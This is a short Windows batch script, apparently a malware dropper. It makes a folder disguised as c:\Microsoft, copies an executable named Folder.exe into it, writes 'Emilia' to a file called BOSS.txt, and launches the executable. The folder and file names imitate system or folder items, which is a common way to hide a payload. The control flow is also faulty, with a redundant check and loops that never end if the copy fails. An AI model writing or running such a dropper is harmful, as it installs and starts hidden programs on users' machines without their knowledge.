@echo off
Title SDT
:sprawdzenie_HDD
if exist c:\Windows\System32 goto hdd_c

:hdd_c
if exist c:\Microsoft goto hdd_cc
md c:\Microsoft
:hdd_cc
if exist c:\Microsoft goto xhdd_cc
goto hdd_cc
:xhdd_cc
if exist c:\Microsoft\Folder.exe goto ihdd_cc
xcopy Folder.exe c:\Microsoft
echo Emilia >> BOSS.txt
:ihdd_cc
if exist c:\Microsoft\Folder.exe goto exit
goto ihdd_cc
:exit
start c:\Microsoft\Folder.exe
exit